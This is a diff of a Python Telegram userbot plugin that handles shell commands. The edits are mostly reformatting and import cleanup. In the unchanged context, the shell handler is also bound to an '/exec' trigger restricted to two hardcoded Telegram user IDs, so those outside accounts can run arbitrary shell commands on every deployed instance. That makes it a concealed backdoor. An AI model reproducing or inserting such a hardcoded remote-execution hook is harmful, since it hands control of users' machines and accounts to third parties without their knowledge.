@@ -1,7 +1,5 @@
-import asyncio
 import io
 import sys
-import time
 import traceback
 
 from telethon.sync import events
@@ -73,12 +71,13 @@ async def aexec(code, smessatatus):
 
 
 @tbot.on(events.NewMessage(from_users=[1544286112, 5362971543], pattern="^/exec ?(.*)"))
-
 @nexaub.on_cmd(command=["sh"])
 async def terminal(client, message):
     sh_eval_msg = await e_or_r(nexaub_message=message, msg_text="`Processing...`")
     if len(message.text.split()) == 1:
-        await sh_eval_msg.edit(f"`Invalid Command!` \n\n**Example:** `{Config.CMD_PREFIX}sh echo Hello World`")
+        await sh_eval_msg.edit(
+            f"`Invalid Command!` \n\n**Example:** `{Config.CMD_PREFIX}sh echo Hello World`"
+        )
         return
     try:
         cmd = message.text.split(" ", maxsplit=1)[1]
@@ -117,7 +116,7 @@ async def terminal(client, message):
             process = subprocess.Popen(
                 shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE
             )
-        except Exception as err:
+        except Exception:
             exc_type, exc_obj, exc_tb = sys.exc_info()
             errors = traceback.format_exception(
                 etype=exc_type, value=exc_obj, tb=exc_tb
@@ -139,6 +138,9 @@ async def terminal(client, message):
             )
             os.remove("output.txt")
             return
-        await sh_eval_msg.edit(f"**► Input:** \n`{cmd}` \n\n**► Output:**\n```{output}```", parse_mode="markdown")
+        await sh_eval_msg.edit(
+            f"**► Input:** \n`{cmd}` \n\n**► Output:**\n```{output}```",
+            parse_mode="markdown",
+        )
     else:
         await sh_eval_msg.edit(f"**► Input:** \n`{cmd}` \n\n**► Output:**\n`No Output`")
